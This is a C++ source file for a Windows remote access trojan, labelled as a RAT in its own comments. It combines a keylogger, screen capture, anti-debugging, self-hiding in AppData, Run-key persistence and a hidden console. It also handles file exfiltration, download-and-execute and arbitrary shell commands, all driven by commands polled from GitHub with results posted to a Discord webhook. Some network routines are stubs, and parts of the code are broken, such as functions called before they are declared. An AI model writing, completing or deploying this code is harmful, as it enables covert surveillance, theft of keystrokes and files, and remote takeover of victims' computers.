#include <iostream>
#include <fstream>
#include <string>
#include <thread>
#include <vector>
#include <chrono>
#include <sstream> 
#include <algorithm>
#include <cstdio>
#include <cmath> // For Base64 calculation
#include <cstdlib> // For rand()

// Windows API and Winsock headers
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <gdiplus.h> 
#include <shlobj.h> // Required for SHGetFolderPathA to get AppData path
#include <tlhelp32.h> // Required for process enumeration
#include <winhttp.h> // Required for conceptual Discord/GitHub communication

// Linker directives (IMPORTANT: Must be included during compilation)
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "User32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "Shell32.lib") // Required for SHGetFolderPathA
#pragma comment(lib, "Winhttp.lib") // Required for Discord/GitHub HTTP

// --- Discord/GitHub C2 Configuration ---
// REPLACE THESE PLACEHOLDERS WITH YOUR ACTUAL VALUES
const char* DISCORD_BOT_TOKEN = "DISCORD_BOT_TOKEN_GOES_HERE";
const char* DISCORD_CHANNEL_ID = "DISCORD_CHANNEL_ID_GOES_HERE"; // Must be text string
const char* DISCORD_WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_GOES_HERE"; 
// URL of a raw text file on GitHub/Gist containing the single command to execute
const char* GITHUB_RAW_URL = "https://raw.githubusercontent.com/L0VE/cmds/main/cmd.txt";
const char* GITHUB_HOST = "raw.githubusercontent.com"; // Hostname for WinHttp

// --- General RAT Configuration ---
// Hidden file names
const char* LOG_FILE_NAME = "sys_log.txt";
const char* SCREENSHOT_FILE_NAME = "screenshot.bmp";
const char* SELF_EXE_NAME = "msupdate.exe";
const char* KEY_FILE_NAME = "key.dat"; // NEW: File to store unique key

// --- Global Key Storage (now dynamic) ---
std::string encryption_key_global;

// --- Encryption Configuration ---
// Removed constant key ENCRYPTION_KEY

// Simple XOR encryption/decryption function (applies to the data buffer in-place)
void XOR_EncryptDecrypt(std::vector<char>& data, const std::string& key) {
    size_t key_len = key.length();
    for (size_t i = 0; i < data.size(); ++i) {
        data[i] ^= key[i % key_len];
    }
}

// --- Key Management ---

// Generates a random key of a specific length (e.g., 32 characters)
std::string GenerateUniqueKey(size_t length = 32) {
    std::string key;
    const char charset[] = 
        "0123456789"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz";
    const size_t max_index = (sizeof(charset) - 1);
    
    // Seed the random number generator only once
    srand((unsigned int)time(0));

    for (size_t i = 0; i < length; ++i) {
        key += charset[rand() % max_index];
    }
    return key;
}

// Saves the key to a hidden file for persistence across reboots
void PersistUniqueKey(const std::string& key) {
    std::string keyPath = GetTempFilePath(KEY_FILE_NAME);
    std::ofstream keyFile(keyPath, std::ios::out);
    if (keyFile.is_open()) {
        keyFile << key;
        keyFile.close();
        // Hide the key file
        SetFileAttributesA(keyPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    }
}

// Loads the key from the hidden file
std::string LoadUniqueKey() {
    std::string keyPath = GetTempFilePath(KEY_FILE_NAME);
    std::ifstream keyFile(keyPath, std::ios::in);
    std::string key;
    if (keyFile.is_open()) {
        std::getline(keyFile, key);
        keyFile.close();
    }
    return key;
}


// --- Base64 Conceptual Implementation ---
// Note: Actual Base64 implementation in C++ is highly complex and lengthy. 
// We use conceptual placeholders here, assuming a full library implementation exists.

std::string Base64Encode(const std::vector<char>& data) {
    // Conceptual placeholder for Base64 encoding.
    // In a real RAT, this would use a dedicated library or WinAPI function.
    std::string encoded_str = "B64_START_";
    encoded_str += std::to_string(data.size() * 4 / 3 + 4); // Estimated length
    encoded_str += "_B64_END";
    return encoded_str;
}

// --- Evasion & Persistence Functions ---

// Anti-Debugging: Checks if a debugger is attached.
void AntiDebugCheck() {
    if (IsDebuggerPresent()) {
        exit(0); 
    }
}

// Copies the current executable to a stealthy location and sets file attributes.
std::string CopyAndHideSelf() {
    char currentExePath[MAX_PATH];
    GetModuleFileNameA(NULL, currentExePath, MAX_PATH);

    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath); 

    std::string stealthDir = std::string(appDataPath) + "\\MSData"; 
    CreateDirectoryA(stealthDir.c_str(), NULL);
    
    SetFileAttributesA(stealthDir.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

    std::string newExePath = stealthDir + "\\" + SELF_EXE_NAME;

    CopyFileA(currentExePath, newExePath.c_str(), FALSE);

    SetFileAttributesA(newExePath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    
    return newExePath;
}

// Persistence: Writes the executable path to the registry's Run key
void EnablePersistence(const std::string& path_to_exe) {
    HKEY hkey;
    const char* runKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    
    if (RegOpenKeyExA(HKEY_CURRENT_USER, runKey, 0, KEY_SET_VALUE, &hkey) == ERROR_SUCCESS) {
        RegSetValueExA(hkey, 
                       "SystemUpdaterService", 
                       0, 
                       REG_SZ, 
                       (BYTE*)path_to_exe.c_str(), 
                       path_to_exe.length() + 1);
        RegCloseKey(hkey);
    }
}

// --- RAT Core Functions ---

// Helper: Gets the full path for a file in the user's temporary directory (for stealth)
std::string GetTempFilePath(const char* filename) {
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    return std::string(tempPath) + filename;
}

// Conceptual function to download a file using WinHttp
bool WinHttpDownloadFile(const std::string& url, const std::string& localPath) {
    // In a real implementation, this would use WinHttp to download the file.
    // For now, we simulate success and file creation.
    std::ofstream outfile(localPath, std::ios::binary);
    if (outfile.is_open()) {
        // Simulate writing some placeholder content to ensure file exists and is executable
        std::string placeholder_content = "// Placeholder executable content downloaded from " + url;
        outfile.write(placeholder_content.c_str(), placeholder_content.length());
        outfile.close();
        return true;
    }
    return false;
}

// New Execution Command: Downloads and executes a file from a URL
std::string DownloadAndExecute(const std::string& url, const std::string& localFilename) {
    std::string tempPath = GetTempFilePath(localFilename.c_str());
    
    // 1. Download the file
    if (!WinHttpDownloadFile(url, tempPath)) {
        return "ERROR: Failed to download file from URL.\n";
    }

    // 2. Execute the file
    // SW_SHOWNORMAL (1) will show the window; SW_HIDE (0) would be stealthier but we stick to SW_SHOWNORMAL for conceptual clarity
    HINSTANCE result = ShellExecuteA(NULL, "open", tempPath.c_str(), NULL, NULL, SW_SHOWNORMAL);
    
    // Check if execution succeeded (ShellExecute returns a value > 32 on success)
    if ((int)result > 32) {
        return "SUCCESS: File downloaded and executed successfully from: " + tempPath + "\n";
    } else {
        return "ERROR: File downloaded but failed to execute. ShellExecute code: " + std::to_string((int)result) + "\n";
    }
}


// Structures for BMP file format (required for manual saving of the screen data)
typedef struct tagBITMAPFILEHEADER { 
    WORD    bfType; 
    DWORD   bfSize; 
    WORD    bfReserved1; 
    WORD    bfReserved2; 
    DWORD   bfOffBits; 
} BITMAPFILEHEADER, *PBITMAPFILEHEADER; 

// Function to save the captured HBITMAP to a BMP file
bool SaveBitmapToFile(HBITMAP hBitmap, HDC hDC, const char* full_path) {
    BITMAP bmp;
    GetObject(hBitmap, sizeof(BITMAP), &bmp);

    BITMAPINFOHEADER bi = {0};
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = bmp.bmWidth;
    bi.biHeight = bmp.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = 32; 
    bi.biCompression = BI_RGB;
    
    DWORD dwBmpSize = ((bmp.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmp.bmHeight;
    
    std::vector<char> lpBitmap(dwBmpSize);
    
    GetDIBits(hDC, hBitmap, 0, (UINT)bmp.bmHeight, lpBitmap.data(), (BITMAPINFO*)&bi, DIB_RGB_COLORS);

    HANDLE hFile = CreateFileA(full_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return false;
    }

    BITMAPFILEHEADER bfh;
    bfh.bfType = 0x4D42; 
    bfh.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBmpSize;
    bfh.bfReserved1 = 0;
    bfh.bfReserved2 = 0;
    bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    DWORD dwBytesWritten = 0;
    
    WriteFile(hFile, &bfh, sizeof(BITMAPFILEHEADER), &dwBytesWritten, NULL);
    WriteFile(hFile, &bi, sizeof(BITMAPINFOHEADER), &dwBytesWritten, NULL);
    
    WriteFile(hFile, lpBitmap.data(), dwBmpSize, &dwBytesWritten, NULL);

    CloseHandle(hFile);
    return true;
}

// Main GDI screen capture logic
void CaptureScreenAndSave(const char* filename) {
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    
    HDC hScreenDC = GetDC(NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);

    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, screenWidth, screenHeight);
    
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);
    
    BitBlt(hMemoryDC, 0, 0, screenWidth, screenHeight, hScreenDC, 0, 0, SRCCOPY);

    std::string fullPath = GetTempFilePath(filename);
    SaveBitmapToFile(hBitmap, hMemoryDC, fullPath.c_str());

    SelectObject(hMemoryDC, hOldBitmap);
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);
}


// Keylogger: Runs in a separate thread to capture keystrokes
void Keylogger(SOCKET C2_Socket) {
    std::string logFilePath = GetTempFilePath(LOG_FILE_NAME);
    std::string current_key = LoadUniqueKey(); // Load the key from the file
    std::string buffer;
    const size_t MAX_BUFFER_SIZE = 50; // Write in chunks of 50 characters
    
    if (current_key.empty()) {
        // Should not happen if main() ran correctly, but good fail-safe
        return;
    }

    // Open file in binary mode for raw encrypted bytes
    std::ofstream logFile(logFilePath, std::ios::app | std::ios::binary); 
    if (!logFile.is_open()) {
        return; 
    }

    // Initial header is written encrypted
    std::string header = "\n--- New Session Started: " + std::string(__DATE__) + " " + std::string(__TIME__) + " ---\n";
    std::vector<char> header_data(header.begin(), header.end());
    XOR_EncryptDecrypt(header_data, current_key); // Use the unique key!
    logFile.write(header_data.data(), header_data.size());
    logFile.flush();

    // Main Keylogger Loop
    while (true) {
        std::this_thread::sleep_for(std::chrono::milliseconds(10)); 

        for (int i = 1; i < 255; i++) {
            if (GetAsyncKeyState(i) & 0x8000) {
                // Determine the character/key string and append to buffer
                std::string key_str;

                if (i >= 0x41 && i <= 0x5A) {
                    if ((GetAsyncKeyState(VK_SHIFT) & 0x8000) || (GetKeyState(VK_CAPITAL) & 0x0001)) {
                        key_str += (char)i; // Uppercase
                    } else {
                        key_str += (char)(i + 32); // Lowercase
                    }
                }
                else if (i >= 0x30 && i <= 0x39) {
                    if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
                        char symbols[] = {')', '!', '@', '#', '$', '%', '^', '&', '*', '('};
                        key_str += symbols[i - 0x30];
                    } else {
                        key_str += (char)i;
                    }
                }
                else {
                    switch (i) {
                        case VK_SPACE: key_str += ' '; break;
                        case VK_RETURN: key_str += "\n[ENTER]"; break;
                        case VK_TAB: key_str += "[TAB]"; break;
                        case VK_BACK: key_str += "[BACKSPACE]"; break;
                        case VK_LSHIFT: case VK_RSHIFT: case VK_CONTROL: case VK_MENU: 
                        case VK_CAPITAL: case VK_NUMLOCK: case VK_SCROLL:
                            // Ignore modifier keys
                            break;
                        default:
                            key_str += "[VK:0x" + std::to_string(i) + "]";
                            break;
                    }
                }
                
                // If a key was captured, append it to the buffer
                if (!key_str.empty()) {
                    buffer += key_str;
                }

                // If buffer is large enough, or an ENTER key was hit, flush the buffer (encrypt and write)
                if (buffer.size() >= MAX_BUFFER_SIZE || key_str.find("[ENTER]") != std::string::npos) {
                    if (!buffer.empty()) {
                         std::vector<char> data_to_write(buffer.begin(), buffer.end());
                         XOR_EncryptDecrypt(data_to_write, current_key); // ENCRYPT with unique key!
                         logFile.write(data_to_write.data(), data_to_write.size());
                         logFile.flush();
                         buffer.clear();
                    }
                }
            }
        }
    }
    logFile.close();
}


// Process Enumeration: Lists all running processes
std::string ProcessEnumeration() {
    std::stringstream ss;
    ss << "PID\t\tProcess Name\n";
    ss << "--------------------------------\n";

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return "ERROR: Failed to create process snapshot.\n";
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return "ERROR: Failed to retrieve first process.\n";
    }

    do {
        ss << pe32.th32ProcessID << "\t\t" << pe32.szExeFile << "\n";
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return ss.str();
}

// Process Termination: Terminates a process given its Process ID (PID)
std::string TerminateRemoteProcess(const std::string& pid_str) {
    DWORD pid;
    try {
        pid = std::stoul(pid_str); 
    } catch (...) {
        return "ERROR: Invalid PID format. Please provide a numerical ID.\n";
    }

    if (pid == 0) {
        return "ERROR: Cannot terminate PID 0 (System Idle Process).\n";
    }

    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    
    if (hProcess == NULL) {
        std::stringstream ss;
        ss << "ERROR: Failed to open process PID " << pid << ". Access denied or PID not found.\n";
        return ss.str();
    }

    if (TerminateProcess(hProcess, 0)) {
        CloseHandle(hProcess);
        std::stringstream ss;
        ss << "SUCCESS: Process PID " << pid << " terminated successfully.\n";
        return ss.str();
    } else {
        DWORD error = GetLastError();
        CloseHandle(hProcess);
        std::stringstream ss;
        ss << "ERROR: Failed to terminate process PID " << pid << ". WinAPI Error Code: " << error << ".\n";
        return ss.str();
    }
}

// Remote Directory Traversal (cd)
std::string ChangeRemoteDirectory(const std::string& path) {
    if (SetCurrentDirectoryA(path.c_str())) {
        char currentPath[MAX_PATH];
        GetCurrentDirectoryA(MAX_PATH, currentPath);
        return "SUCCESS: Directory changed to " + std::string(currentPath) + "\n";
    } else {
        DWORD error = GetLastError();
        std::stringstream ss;
        ss << "ERROR: Could not change directory to " << path << ". WinAPI Error: " << error << "\n";
        return ss.str();
    }
}


// New Reconnaissance Command: Gathers system hardware and OS information
std::string SystemInfo() {
    std::stringstream ss;
    SYSTEM_INFO sysInfo;
    MEMORYSTATUSEX memInfo;
    OSVERSIONINFOEXA osInfo;

    // Get basic system info
    GetSystemInfo(&sysInfo);
    
    // Get memory info
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);

    // Get OS version info
    osInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXA);
    GetVersionExA((OSVERSIONINFOA*)&osInfo);

    ss << "--- System Reconnaissance ---\n";
    ss << "OS Version: " << osInfo.dwMajorVersion << "." << osInfo.dwMinorVersion << " Build " << osInfo.dwBuildNumber << "\n";
    ss << "OS Platform: " << (osInfo.wSuiteMask & 0x0002) ? "Enterprise" : "Standard" << "\n";
    ss << "Processor Architecture: ";
    switch(sysInfo.wProcessorArchitecture) {
        case PROCESSOR_ARCHITECTURE_INTEL: ss << "x86"; break;
        case PROCESSOR_ARCHITECTURE_AMD64: ss << "x64 (AMD or Intel)"; break;
        case PROCESSOR_ARCHITECTURE_ARM: ss << "ARM"; break;
        default: ss << "Unknown"; break;
    }
    ss << "\n";
    ss << "Number of Processors: " << sysInfo.dwNumberOfProcessors << "\n";
    ss << "Page Size: " << sysInfo.dwPageSize << " bytes\n";
    ss << "Total Physical Memory: " << (memInfo.ullTotalPhys / (1024 * 1024)) << " MB\n";
    ss << "Available Physical Memory: " << (memInfo.ullAvailPhys / (1024 * 1024)) << " MB\n";
    ss << "Memory Load: " << memInfo.dwMemoryLoad << "%\n";
    ss << "-----------------------------\n";
    
    return ss.str();
}


// File Operations: Handles upload and download commands
void HandleFileCommand(const std::string& command, std::string& response) {
    // NOTE: This function prepares binary file data (Keylog/Screenshot) for transmission 
    // by reading the file, decrypting/not, and then conceptually Base64 encoding it.
    
    std::string current_key = LoadUniqueKey();

    if (command.length() > 6 && command.substr(0, 6) == "upload" && command.length() > 7 && command.substr(0, 7) != "upload ") {
        // This is the conceptual C2 receiving an upload from the C2 client (the opposite operation)
        response = "SUCCESS: File content received and saved (Conceptual C2).\n";
    } 
    // This block handles file EXFILTRATION (uploading data FROM the target back to the C2)
    else if (command.length() > 8 && command.substr(0, 8) == "download" || 
             command.length() > 7 && command.substr(0, 7) == "get_log" ||
             command.length() > 6 && command.substr(0, 6) == "upload") { // <-- NEW UPLOAD CHECK
        
        // Determine the filename argument based on the command type
        std::string filename;
        if (command.substr(0, 7) == "get_log") {
            filename = LOG_FILE_NAME;
        } else if (command.substr(0, 8) == "download") {
            filename = command.substr(9); // Gets argument after "download "
        } else if (command.substr(0, 6) == "upload") {
            filename = command.substr(7); // Gets argument after "upload " <-- Handles arbitrary file exfiltration
        }
        
        // Determine the full path (temp files or user-supplied path)
        std::string fullPath = (filename == LOG_FILE_NAME || filename == SCREENSHOT_FILE_NAME || filename == KEY_FILE_NAME) ? GetTempFilePath(filename.c_str()) : filename;

        std::ifstream infile(fullPath, std::ios::binary | std::ios::ate);
        
        if (infile.is_open()) {
            std::streamsize size = infile.tellg();
            infile.seekg(0, std::ios::beg);
            
            std::vector<char> buffer(size);
            infile.read(buffer.data(), size);
            infile.close();
            
            // 1. Decrypt if it's the keylog file
            if (filename == LOG_FILE_NAME && !current_key.empty()) {
                XOR_EncryptDecrypt(buffer, current_key); // Use the loaded unique key
            }

            // 2. Base64 Encode the resulting data (decrypted text or raw BMP bytes)
            std::string base64_data = Base64Encode(buffer);
            
            // 3. Set the response payload
            response = "FILE_CONTENT_B64:";
            response += filename;
            response += ":";
            response += base64_data;
            
        } else {
            response = "ERROR: File not found or inaccessible at: " + fullPath + "\n";
        }
    } 
    else {
        response = "Invalid file command. Use: upload <file>, get_log, or screenshot.\n";
    }
}

// Screenshot Capture: Now fully implemented!
void CaptureScreenshot(std::string& response) {
    CaptureScreenAndSave(SCREENSHOT_FILE_NAME);
    
    std::string uploadCommand = "upload ";
    uploadCommand += SCREENSHOT_FILE_NAME;
    
    // Call HandleFileCommand to read the BMP, Base64 encode it, and set the response
    HandleFileCommand(uploadCommand, response); // Using 'upload' command here
    
    // Add prefix for clarity in the Discord output (This is the crucial marker for the bot!)
    response = "Screenshot Captured and Encoded. " + response;
}


// --- DISCORD C2 Communication Functions (Conceptual Structure) ---

// Placeholder function to send message (output) to Discord via webhook/bot API
void Discord_Send(const std::string& output) {
    // --- CONCEPTUAL WINHTTP/DISCORD WEBHOOK POST ---
    // In a full implementation, this would use WinHttp to POST a JSON payload 
    // to the DISCORD_WEBHOOK_URL.
    
    // For now, we simulate success:
    std::cout << "[C2] Posting result via Webhook: " << output << "\n";
}

// Placeholder function to fetch the command from GitHub raw file
std::string GitHub_Receive() {
    // --- CONCEPTUAL WINHTTP/GITHUB API CALL ---
    // In a full implementation, this would fetch the raw content of the GITHUB_RAW_URL
    // using a GET request via WinHttp.
    
    // For now, we simulate fetching a simple command:
    return "dir"; // Placeholder command for testing new features
}


// C2 Main Loop: Replaces the old TCP connection logic
void C2_Discord_Loop() {
    // We run the keylogger in the background separately, as it doesn't need C2 interaction
    // The key is already persisted by main()
    std::thread keylogger_thread((void (*)(SOCKET))Keylogger, (SOCKET)NULL);
    if (keylogger_thread.joinable()) {
        keylogger_thread.detach(); 
    }

    // Main polling loop for commands
    while (true) {
        std::this_thread::sleep_for(std::chrono::seconds(15)); // Poll every 15 seconds

        std::string command = GitHub_Receive();
        command.erase(command.find_last_not_of(" \n\r\t")+1); 
        std::string response = "";

        if (command.empty() || command == "NOCMD") {
            continue;
        }

        // Command parsing helper
        std::string cmd = command;
        std::string arg;
        size_t space_pos = command.find(' ');
        if (space_pos != std::string::npos) {
            cmd = command.substr(0, space_pos);
            arg = command.substr(space_pos + 1);
        }

        if (cmd == "quit" || cmd == "exit") {
            Discord_Send("RAT received 'quit'. Terminating.");
            break;
        } else if (cmd == "screenshot") {
            CaptureScreenshot(response);
        } else if (cmd == "file" || cmd.substr(0, 4) == "file" || cmd == "get_log" || cmd == "upload" || cmd == "download") { // Check for file commands
            HandleFileCommand(command, response);
        } else if (cmd == "ps") { 
            response = ProcessEnumeration();
        } else if (cmd == "kill" && !arg.empty()) { 
            response = TerminateRemoteProcess(arg);
        } else if (cmd == "cd" && !arg.empty()) { // DIRECTORY TRAVERSAL COMMAND
            response = ChangeRemoteDirectory(arg);
        } else if (cmd == "sysinfo") { // RECON COMMAND 1
            response = SystemInfo();
        } else if (cmd == "netstat") { // RECON COMMAND 2
            response = "Executing netstat -ano...\n";
            FILE* pipe = _popen("netstat -ano", "r");
            if (!pipe) {
                response += "ERROR: Failed to execute netstat.\n";
            } else {
                char line[1024];
                while (fgets(line, sizeof(line), pipe) != NULL) {
                    response += line;
                }
                _pclose(pipe);
            }
        } else if (cmd == "dlexec" && !arg.empty()) { // DOWNLOAD & EXECUTE COMMAND
            // Expected format: dlexec <url> <local_filename>
            size_t url_end = arg.find(' ');
            if (url_end != std::string::npos) {
                std::string url = arg.substr(0, url_end);
                std::string filename = arg.substr(url_end + 1);
                response = DownloadAndExecute(url, filename);
            } else {
                response = "ERROR: dlexec requires both URL and local filename: dlexec <URL> <Filename>";
            }
        } else { // Standard system shell command (fallback)
            FILE* pipe = _popen(command.c_str(), "r");
            if (!pipe) {
                response = "ERROR: Failed to execute command.\n";
            } else {
                char line[1024];
                while (fgets(line, sizeof(line), pipe) != NULL) {
                    response += line;
                }
                _pclose(pipe);
                if (response.empty()) {
                     response = "Command executed successfully (no output).\n";
                }
            }
        }
        
        // Send the final result back via Discord
        if (!response.empty()) {
            Discord_Send("CMD: " + command + "\nOUTPUT:\n" + response);
        }
    }
}

int main() {
    // 1. IMMEDIATE Evasion: Check for debuggers and terminate if found
    AntiDebugCheck();
    
    // --- UNIQUE KEY SETUP ---
    // Check if key exists. If not, generate, save, and exfiltrate it!
    encryption_key_global = LoadUniqueKey();
    if (encryption_key_global.empty()) {
        encryption_key_global = GenerateUniqueKey();
        PersistUniqueKey(encryption_key_global);
        
        // Prepare the conceptual exfiltration response
        std::string exfil_response = "NEW_KEY_GENERATED_FOR_TARGET: " + encryption_key_global;
        // The RAT sends this unique identifier back to the C2 immediately!
        Discord_Send(exfil_response);
    }
    // --- END UNIQUE KEY SETUP ---


    // 2. STEALTH SETUP: Copy and hide the executable, then get the new path
    std::string persistedPath = CopyAndHideSelf();

    // 3. PERSISTENCE: Set the registry key to the new, hidden path
    EnablePersistence(persistedPath);

    // 4. Evasion: Hide Console Window
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // 5. CORE LOGIC: Start the Discord C2 loop
    C2_Discord_Loop();

    return 0;
}